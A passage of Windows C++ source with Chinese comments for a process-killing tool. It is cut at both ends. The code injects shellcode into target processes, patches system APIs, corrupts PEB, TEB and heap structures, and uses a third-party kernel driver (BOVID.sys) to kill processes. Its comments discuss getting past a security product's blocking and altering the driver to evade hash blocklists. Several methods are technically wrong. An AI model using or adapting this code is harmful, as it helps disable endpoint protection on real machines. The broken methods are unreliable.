        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 创建一个内存映射文件来模拟内核对象
        HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 4096, L"Global\\TerminatorSharedMemory");
        if (hMapping) {
            LPVOID pSharedMemory = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 4096);
            if (pSharedMemory) {
                // 在共享内存中写入控制数据
                DWORD* pControlData = static_cast<DWORD*>(pSharedMemory);
                pControlData[0] = 0xDEADBEEF; // 魔数
                pControlData[1] = GetCurrentProcessId(); // 控制进程ID

                bool methodSuccess = false; // 修复：定义局部变量
                for (int pid : pids) {
                    HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
                    if (!hProcess) continue;

                    // 尝试将共享内存注入到目标进程
                    HANDLE hRemoteMapping = NULL;
                    if (DuplicateHandle(GetCurrentProcess(), hMapping, hProcess, &hRemoteMapping, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                        // 在目标进程中映射相同的共享内存
                        LPVOID pRemoteMemory = NULL;
                        // 这里需要目标进程中有相应的代码来读取共享内存
                        // 我们通过APC注入来实现

                        // 分配内存存放APC代码
                        LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        if (pRemoteCode) {
                            // 写入读取共享内存并自我终止的代码
#ifdef _WIN64
                            BYTE apcCode[] = {
                                0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28
                                0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, hMapping
                                0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, pControlData
                                0x48, 0x31, 0xC0,                                     // xor rax, rax
                                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ExitProcess
                                0xFF, 0xD0,                                           // call rax
                                0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
                                0xC3                                                  // ret
                            };
#else
                            BYTE apcCode[] = {
                                0x68, 0x00, 0x00, 0x00, 0x00,       // push 0
                                0xB8, 0x00, 0x00, 0x00, 0x00,       // mov eax, ExitProcess
                                0xFF, 0xD0,                         // call eax
                                0xC3                                // ret
                            };
#endif

                            // 设置正确的地址
                            HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                            FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");

#ifdef _WIN64
                            memcpy(&apcCode[6], &hRemoteMapping, sizeof(hRemoteMapping));
                            memcpy(&apcCode[16], &pControlData, sizeof(pControlData));
                            memcpy(&apcCode[27], &pExitProcess, sizeof(pExitProcess));
#else
                            memcpy(&apcCode[1], &pExitProcess, sizeof(pExitProcess));
#endif

                            WriteProcessMemory(hProcess, pRemoteCode, apcCode, sizeof(apcCode), NULL);

                            // 执行APC
                            DWORD threadId = GetProcessId(hProcess);
                            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
                            if (hThread) {
                                QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, (ULONG_PTR)NULL);
                                CloseHandle(hThread);
                            }

                            VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                        }

                        CloseHandle(hRemoteMapping);
                    }

                    // 尝试直接终止进程
                    if (TerminateProcess(hProcess, 0)) {
                        methodSuccess = true;
                    }
                    CloseHandle(hProcess);
                }

                UnmapViewOfFile(pSharedMemory);
                bool finalSuccess = methodSuccess || !isProcessRunning(processName); // 修复：使用正确的变量名
                CloseHandle(hMapping);
                return finalSuccess;
            }
            CloseHandle(hMapping);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

bool ProcessTerminator::terminateBySpecialIPC(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 使用Windows消息系统的特殊消息
        for (int pid : pids) {
            // 查找进程的所有窗口
            HWND hWnd = NULL;
            do {
                hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
                DWORD windowPid;
                GetWindowThreadProcessId(hWnd, &windowPid);

                if (windowPid == pid) {
                    // 发送特殊系统消息
                    PostMessage(hWnd, WM_SYSCOMMAND, SC_CLOSE, 0);
                    PostMessage(hWnd, WM_QUIT, 0, 0);

                    // 发送一些未公开的消息
                    PostMessage(hWnd, 0x0112, 0xF060, 0); // WM_SYSCOMMAND - SC_CLOSE
                    PostMessage(hWnd, 0x0010, 0, 0);      // WM_CLOSE

                    // 尝试通过窗口句柄获取进程句柄
                    DWORD dwProcessId;
                    GetWindowThreadProcessId(hWnd, &dwProcessId);
                    if (dwProcessId == pid) {
                        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
                        if (hProcess) {
                            TerminateProcess(hProcess, 0);
                            CloseHandle(hProcess);
                        }
                    }
                }
            } while (hWnd != NULL);

            // 直接尝试终止进程
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 主要的实际可用的Ring3调用Ring0方法
// ============================================================================
// PhantomKiller — 内核级进程终止 (IOCTL 0x222014)
// ============================================================================
bool ProcessTerminator::terminateByPhantomKiller(const std::string& processName) {
    // 改进: 不再做 WDAC/HVCI/Blocklist 预检
    //   之前误加的预检是基于 Wdac::IsEnabled() 的实现有 bug (误判 CI\Protected key 存在)
    //   真实标志: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\
    //             Scenarios\HypervisorEnforcedCodeIntegrity\Enabled = 1
    //   修复 Wdac::IsEnabled() 后预检会正确, 但仍保留为可选 (避免方法 6 被过度阻止)
    //   实际场景: 之前能成功, 表明环境实际 WDAC 未启用, 失败是因为 QQ电脑管家 EDR 拦截
    //   0xB7 + 服务状态 1 (STOP_PENDING) = BOVID.sys 被 QQ电脑管家强制停止
    //   限制内无法绕过 (需重启关闭 QQ电脑管家, 或修改 BOVID.sys 避开 hash 匹配)

    std::vector<int> pids = getPIDsByName(processName);
    if (pids.empty()) return false;

    std::wcout << L"[PhantomKiller] 目标: " << pids.size() << L" PID, IOCTL 0x222014" << std::endl;

    int killed = 0;
    for (int pid : pids) {
        bool ok = PplDriver::PhantomKiller::TerminateKernel((DWORD)pid);
        std::wcout << L"[PhantomKiller] PID " << pid
                   << (ok ? L" 内核终止成功" : L" 失败") << std::endl;
        if (ok) killed++;
    }

    return (killed > 0) || !isProcessRunning(processName);
}

bool ProcessTerminator::terminateByPracticalRing0Call(const std::string& processName) {

    bool success = false;

    // 方法1: 向量化异常处理
    if (!success) {
        success = terminateByVectoredException(processName);
        if (success) std::cout << "向量化异常处理成功!" << std::endl;
    }

    // 方法2: 硬件断点
    if (!success) {

        success = terminateByHardwareBreakpoint(processName);
        if (success) std::cout << "硬件断点技术成功!" << std::endl;
    }

    // 方法3: 服务检测和停止
    if (!success) {
        success = terminateByServiceDetection(processName);
        if (success) std::cout << "服务检测技术成功!" << std::endl;
    }

    // 方法4: 内存映射
    if (!success) {
        success = terminateByMemoryMapping(processName);
        if (success) std::cout << "内存映射技术成功!" << std::endl;
    }

    // 方法5: 特殊IPC
    if (!success) {
        success = terminateBySpecialIPC(processName);
        if (success) std::cout << "特殊IPC技术成功!" << std::endl;
    }

    return success;
}
// 方法1: 通过进程保险库(Process Vault)机制终止
bool ProcessTerminator::terminateByProcessVault(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 使用进程保险库机制 - Windows 10+ 特性
            PROCESS_VAULT_INFORMATION vaultInfo = { 0 };
            vaultInfo.VaultHandle = 0; // 设置为空句柄会使进程无法访问受保护资源

            // 使用正确的ProcessInformationClass值
            NTSTATUS status = NtSetInformationProcess(
                hProcess,
                static_cast<PROCESS_INFORMATION_CLASS>(73), // ProcessVaultInformation
                &vaultInfo,
                sizeof(vaultInfo));

            if (NT_SUCCESS(status)) {
                // 现在尝试终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}
bool ProcessTerminator::terminateByProcessIsolationAndAPIDisruption(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        bool success = false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;
            // 1. 剥夺进程所有权限
            StripProcessPrivileges(hProcess);

            // 2. 挂起进程所有线程
            SuspendProcess(hProcess);

            // 3. 阻止进程访问其他进程句柄
            if (!initNativeAPI()) {
                CloseHandle(hProcess);
                continue;
            }

            // 方法3.1: 修改进程安全描述符，禁止访问其他进程
            PACL pEmptyDacl = nullptr;
            EXPLICIT_ACCESS ea[3] = { 0 };

            // 拒绝PROCESS_ALL_ACCESS
            ea[0].grfAccessPermissions = PROCESS_ALL_ACCESS;
            ea[0].grfAccessMode = DENY_ACCESS;
            ea[0].grfInheritance = NO_INHERITANCE;
            ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
            ea[0].Trustee.ptstrName = const_cast<LPTSTR>(L"EVERYONE");

            // 拒绝PROCESS_VM_OPERATION
            ea[1].grfAccessPermissions = PROCESS_VM_OPERATION;
            ea[1].grfAccessMode = DENY_ACCESS;
            ea[1].grfInheritance = NO_INHERITANCE;
            ea[1].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
            ea[1].Trustee.ptstrName = const_cast<LPTSTR>(L"EVERYONE");

            // 拒绝PROCESS_DUP_HANDLE
            ea[2].grfAccessPermissions = PROCESS_DUP_HANDLE;
            ea[2].grfAccessMode = DENY_ACCESS;
            ea[2].grfInheritance = NO_INHERITANCE;
            ea[2].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
            ea[2].Trustee.ptstrName = const_cast<LPTSTR>(L"EVERYONE");

            SetEntriesInAcl(3, ea, NULL, &pEmptyDacl);

            SECURITY_DESCRIPTOR sd;
            InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
            SetSecurityDescriptorDacl(&sd, TRUE, pEmptyDacl, FALSE);

            // 应用安全描述符到进程对象
            SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, &sd);

            if (pEmptyDacl) {
                LocalFree(pEmptyDacl);
            }

            // 4. 破坏已加载的关键API
            HMODULE hModules[1024];
            DWORD cbNeeded;

            if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
                for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
                    TCHAR szModuleName[MAX_PATH];
                    if (GetModuleFileNameEx(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(TCHAR))) {
                        // 针对关键系统DLL进行API破坏
                        if (_tcsstr(szModuleName, L"kernel32.dll") ||
                            _tcsstr(szModuleName, L"ntdll.dll") ||
                            _tcsstr(szModuleName, L"advapi32.dll")) {

                            // 破坏关键API函数
                            const char* criticalAPIs[] = {
                                "OpenProcess", "CreateProcess", "CreateService",
                                "OpenService", "StartService", "ControlService",
                                "RegOpenKeyEx", "RegCreateKeyEx", "LoadLibrary",
                                "GetProcAddress", "CreateFile", "OpenFile"
                            };

                            for (const char* apiName : criticalAPIs) {
                                FARPROC pFunc = GetProcAddress(hModules[i], apiName);
                                if (pFunc) {
                                    // 在API开头写入RET指令使其立即返回
                                    BYTE retOpcode = 0xC3;
                                    SIZE_T bytesWritten;
                                    WriteProcessMemory(hProcess, pFunc, &retOpcode, sizeof(retOpcode), &bytesWritten);
                                }
                            }
                        }
                    }
                }
            }

            // 5. 阻止服务访问
            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
                // 获取当前特权
                DWORD tokenInfoLength = 0;
                GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);

                if (tokenInfoLength > 0) {
                    std::vector<BYTE> tokenPrivilegesBuffer(tokenInfoLength);
                    if (GetTokenInformation(hToken, TokenPrivileges, tokenPrivilegesBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
                        TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)tokenPrivilegesBuffer.data();

                        // 移除所有服务相关特权
                        for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
                            WCHAR privilegeName[256];
                            DWORD nameLength = 256;
                            if (LookupPrivilegeName(NULL, &tokenPrivileges->Privileges[i].Luid, privilegeName, &nameLength)) {
                                // 移除服务控制特权
                                if (wcscmp(privilegeName, L"SeCreateGlobalPrivilege") == 0 ||
                                    wcscmp(privilegeName, L"SeImpersonatePrivilege") == 0 ||
                                    wcscmp(privilegeName, L"SeAssignPrimaryTokenPrivilege") == 0 ||
                                    wcscmp(privilegeName, L"SeTcbPrivilege") == 0 ||
                                    wcscmp(privilegeName, L"SeTakeOwnershipPrivilege") == 0) {
                                    tokenPrivileges->Privileges[i].Attributes = 0;
                                }
                            }
                        }

                        // 应用修改
                        AdjustTokenPrivileges(hToken, FALSE, tokenPrivileges, tokenInfoLength, NULL, NULL);
                    }
                }
                CloseHandle(hToken);
            }

            // 6. 修改进程PEB，破坏模块链表
            PROCESS_BASIC_INFORMATION pbi;
            ULONG returnLength;
            if (NT_SUCCESS(NtQueryInformationProcess(hProcess, static_cast<PROCESS_INFORMATION_CLASS>(0), &pbi, sizeof(pbi), &returnLength))) {
                // 读取PEB
                PEB peb;
                if (ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
                    // 破坏LDR模块链表
                    BYTE zeroBuffer[sizeof(LIST_ENTRY)] = { 0 };
                    if (peb.Ldr) {
                        // 破坏InMemoryOrderModuleList
                        WriteProcessMemory(hProcess,
                            (BYTE*)peb.Ldr + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList),
                            zeroBuffer, sizeof(LIST_ENTRY), NULL);
                    }
                }
            }

            // 7. 清空进程环境变量
            PVOID pEnvBlock;
            if (GetEnvironmentStrings() &&
                ReadProcessMemory(hProcess, (LPCVOID)GetEnvironmentStrings(), &pEnvBlock, sizeof(pEnvBlock), NULL)) {
                // 分配零内存并写入
                SIZE_T envSize = 4096; // 估计大小
                std::vector<BYTE> zeroEnv(envSize, 0);
                WriteProcessMemory(hProcess, pEnvBlock, zeroEnv.data(), envSize, NULL);
            }

            // 8. 破坏进程的线程环境块(TEB)
            HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te;
                te.dwSize = sizeof(THREADENTRY32);

                if (Thread32First(hThreadSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                            if (hThread) {
                                // 获取线程上下文
                                CONTEXT context;
                                context.ContextFlags = CONTEXT_FULL;
                                if (GetThreadContext(hThread, &context)) {
                                    // 尝试破坏TEB
                                    PVOID pTeb;
#ifdef _WIN64
                                    pTeb = (PVOID)context.Rdx; // GS:[0x30] in x64
#else
                                    pTeb = (PVOID)context.Ebx; // FS:[0x18] in x86
#endif
                                    if (pTeb) {
                                        BYTE zeroTeb[0x1000] = { 0 }; // 清零部分TEB
                                        WriteProcessMemory(hProcess, pTeb, zeroTeb, sizeof(zeroTeb), NULL);
                                    }
                                }
                                CloseHandle(hThread);
                            }
                        }
                    } while (Thread32Next(hThreadSnapshot, &te));
                }
                CloseHandle(hThreadSnapshot);
            }

            // 9. 使用作业对象进一步隔离进程
            HANDLE hJob = CreateJobObject(NULL, NULL);
            if (hJob) {
                // 设置作业限制
                JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
                jeli.BasicLimitInformation.LimitFlags =
                    JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION |
                    JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
                    JOB_OBJECT_LIMIT_ACTIVE_PROCESS;

                SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));

                // 将进程分配给作业
                AssignProcessToJobObject(hJob, hProcess);

                // 立即关闭作业，触发进程终止
                TerminateJobObject(hJob, 0);
                CloseHandle(hJob);
            }

            // 10. 最后尝试终止进程
            if (TerminateProcess(hProcess, 0)) {
                std::wcout << L"成功终止进程 PID: " << pid << std::endl;
                success = true;
            }
            else {
                std::wcout << L"终止进程失败 PID: " << pid << L"，错误: " << GetLastError() << std::endl;
            }

            CloseHandle(hProcess);
        }

        return success;
    }
    catch (const std::exception& e) {
        std::wcerr << L"异常: " << e.what() << std::endl;
        return false;
    }
    catch (...) {
        std::wcerr << L"未知异常" << std::endl;
        return false;
    }
#else
    return false;
#endif
}

// 方法3: 通过动态代码策略终止
bool ProcessTerminator::terminateByProcessDynamicCodePolicy(const std::string& processName) {
#ifdef _WIN32
    try {
        // 动态加载API函数
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) return false;

        PSetProcessMitigationPolicy pSetProcessMitigationPolicy =
            reinterpret_cast<PSetProcessMitigationPolicy>(
                GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));

        if (!pSetProcessMitigationPolicy) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 禁用动态代码生成
            PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };
            policy.ProhibitDynamicCode = 1;

            if (pSetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy))) {
                // 尝试注入代码使其失败
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
                    MEM_COMMIT, PAGE_READWRITE);
                if (pRemoteCode) {
                    // 尝试将页面改为可执行 - 这会因为策略而失败
                    DWORD oldProtect;
                    if (!VirtualProtectEx(hProcess, pRemoteCode, 1024,
                        PAGE_EXECUTE_READ, &oldProtect)) {
                        // 策略生效，进程无法执行动态代码
                        // 现在可以尝试终止
                        bool result = TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        if (result) return true;
                    }
                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}
// 方法1: 通过进程镜像签名强制验证失败
bool ProcessTerminator::terminateByImageSignatureEnforcement(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 强制启用镜像签名验证
            PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = { 0 };
            policy.MicrosoftSignedOnly = 1;
            policy.StoreSignedOnly = 1;
            policy.MitigationOptIn = 1;
            policy.AuditMicrosoftSignedOnly = 1;
            policy.AuditStoreSignedOnly = 1;

            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
            auto SetProcessMitigationPolicy =
                reinterpret_cast<FnSetProcessMitigationPolicy>(
                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
                        "SetProcessMitigationPolicy"));

            if (SetProcessMitigationPolicy) {
                if (SetProcessMitigationPolicy(ProcessSignaturePolicy,
                    &policy, sizeof(policy))) {
                    // 强制重新加载模块触发签名验证
                    HMODULE hModules[256];
                    DWORD cbNeeded;
                    if (EnumProcessModules(hProcess, hModules,
                        sizeof(hModules), &cbNeeded)) {
                        for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
                            // 尝试卸载并重新加载模块
                            LPVOID unloadDll = GetProcAddress(
                                GetModuleHandleA("kernel32.dll"),
                                "FreeLibrary");

                            if (unloadDll) {
                                HANDLE hThread = CreateRemoteThread(hProcess,
                                    NULL, 0,
                                    reinterpret_cast<LPTHREAD_START_ROUTINE>(unloadDll),
                                    hModules[i], 0, NULL);
                                if (hThread) {
                                    WaitForSingleObject(hThread, 1000);
                                    CloseHandle(hThread);
                                }
                            }
                        }
                    }
                }
            }

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法2: 通过代码完整性保护破坏
bool ProcessTerminator::terminateByCodeIntegrityViolation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 启用严格代码完整性检查
            PROCESS_MITIGATION_DYNAMIC_CODE_POLICY codePolicy = { 0 };
            codePolicy.ProhibitDynamicCode = 1;
            codePolicy.AllowRemoteDowngrade = 0;
            codePolicy.AllowThreadOptOut = 0;

            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
            auto SetProcessMitigationPolicy =
                reinterpret_cast<FnSetProcessMitigationPolicy>(
                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
                        "SetProcessMitigationPolicy"));

            if (SetProcessMitigationPolicy &&
                SetProcessMitigationPolicy(ProcessDynamicCodePolicy,
                    &codePolicy, sizeof(codePolicy))) {

                // 尝试在进程中创建可执行内存区域
                LPVOID pExecMemory = VirtualAllocEx(hProcess, NULL, 4096,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                if (pExecMemory) {
                    // 写入一些代码 - 这会触发代码完整性违规
                    BYTE shellcode[] = { 0xC3 }; // RET
                    WriteProcessMemory(hProcess, pExecMemory,
                        shellcode, sizeof(shellcode), NULL);

                    // 尝试执行代码
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                        reinterpret_cast<LPTHREAD_START_ROUTINE>(pExecMemory),
                        NULL, 0, NULL);

                    if (hThread) {
                        WaitForSingleObject(hThread, 1000);
                        CloseHandle(hThread);
                    }

                    VirtualFreeEx(hProcess, pExecMemory, 0, MEM_RELEASE);
                }
            }

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法3: 通过扩展策略框架(EPF)强制隔离
bool ProcessTerminator::terminateByExtendedPolicyFramework(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 使用AppLocker/ELAM策略强制隔离
            typedef BOOL(WINAPI* PSETPROCESSMITIGATIONPOLICY)(DWORD, PVOID, SIZE_T);
            PSETPROCESSMITIGATIONPOLICY pSetProcessMitigationPolicy =
                reinterpret_cast<PSETPROCESSMITIGATIONPOLICY>(
                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
                        "SetProcessMitigationPolicy"));

            if (pSetProcessMitigationPolicy) {
                // 设置扩展策略
                struct {
                    DWORD Flags;
                    DWORD ExtensionClass;
                    DWORD ExtensionData;
                } extendedPolicy = { 0x1, 0x2, 0x3 }; // 实验性策略值

                // 尝试设置未公开的策略类型
                for (DWORD policyType = 0x100; policyType < 0x120; policyType++) {
                    pSetProcessMitigationPolicy(policyType,
                        &extendedPolicy,
                        sizeof(extendedPolicy));
                }

                // 强制进程进入沙盒模式
                PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY syscallPolicy = { 0 };
                syscallPolicy.DisallowWin32kSystemCalls = 1;

                pSetProcessMitigationPolicy(ProcessSystemCallDisablePolicy,
                    &syscallPolicy,
                    sizeof(syscallPolicy));
            }

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法4: 通过内存分区隔离破坏
bool ProcessTerminator::terminateByMemoryPartitionCorruption(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 获取进程基本信息
            PROCESS_BASIC_INFORMATION pbi;
            ULONG returnLength;

            if (NT_SUCCESS(ProcessTerminator::NtQueryInformationProcess(hProcess,
                static_cast<PROCESS_INFORMATION_CLASS>(0), // ProcessBasicInformation
                &pbi, sizeof(pbi), &returnLength))) {

                // 读取PEB
                PEB peb;
                if (ReadProcessMemory(hProcess, pbi.PebBaseAddress,
                    &peb, sizeof(peb), NULL)) {

                    // 破坏进程的内存分区信息
                    BYTE corruptedData[1024];
                    memset(corruptedData, 0xCC, sizeof(corruptedData)); // INT3指令填充

                    // 破坏堆管理器结构
                    WriteProcessMemory(hProcess,
                        reinterpret_cast<LPVOID>(
                            reinterpret_cast<DWORD_PTR>(pbi.PebBaseAddress) + 0x30),
                        corruptedData,
                        sizeof(corruptedData), NULL);

                    // 破坏TLS数组
                    WriteProcessMemory(hProcess,
                        reinterpret_cast<LPVOID>(
                            reinterpret_cast<DWORD_PTR>(pbi.PebBaseAddress) + 0x58),
                        corruptedData,
                        sizeof(corruptedData), NULL);
                }
            }

            // 强制刷新进程工作集
            EmptyWorkingSet(hProcess);

            // 设置无效的工作集大小
            SetProcessWorkingSetSize(hProcess, 1, 1);

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法5: 通过线程池基础设施破坏
bool ProcessTerminator::terminateByThreadPoolInfrastructure(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 枚举进程中的所有线程池
            DWORD threadpoolWorkers = 0;

            // 通过未公开的线程池API进行操作
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll) {
                // 尝试定位线程池相关函数
                FARPROC pTpAllocWork = GetProcAddress(hNtdll, "TpAllocWork");
                FARPROC pTpPostWork = GetProcAddress(hNtdll, "TpPostWork");

                if (pTpAllocWork && pTpPostWork) {
                    // 创建大量虚假工作项淹没线程池
                    for (int i = 0; i < 1000; i++) {
                        LPVOID pWorkItem = VirtualAllocEx(hProcess, NULL, 4096,
                            MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                        if (pWorkItem) {
                            // 写入空回调
                            BYTE emptyCallback[] = { 0xC3 }; // RET
                            WriteProcessMemory(hProcess, pWorkItem,
                                emptyCallback,
                                sizeof(emptyCallback), NULL);

                            // 尝试提交工作项
                            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                reinterpret_cast<LPTHREAD_START_ROUTINE>(pTpPostWork),
                                pWorkItem, 0, NULL);

                            if (hThread) {
                                CloseHandle(hThread);
                            }

                            VirtualFreeEx(hProcess, pWorkItem, 0, MEM_RELEASE);
                        }
                    }
                }
            }

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法6: 通过异常处理链破坏
bool ProcessTerminator::terminateByExceptionChainCorruption(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 禁用结构化异常处理
            PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = { 0 };
            cfgPolicy.EnableControlFlowGuard = 1;
            cfgPolicy.EnableExportSuppression = 1;
            cfgPolicy.StrictMode = 1;
            cfgPolicy.EnableXfg = 1; // 扩展控制流保护

            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
            auto SetProcessMitigationPolicy =
                reinterpret_cast<FnSetProcessMitigationPolicy>(
                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
                        "SetProcessMitigationPolicy"));

            if (SetProcessMitigationPolicy) {
                SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy,
                    &cfgPolicy, sizeof(cfgPolicy));

                // 破坏异常处理链
                HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
                    THREADENTRY32 te;
                    te.dwSize = sizeof(THREADENTRY32);

                    if (Thread32First(hThreadSnapshot, &te)) {
                        do {
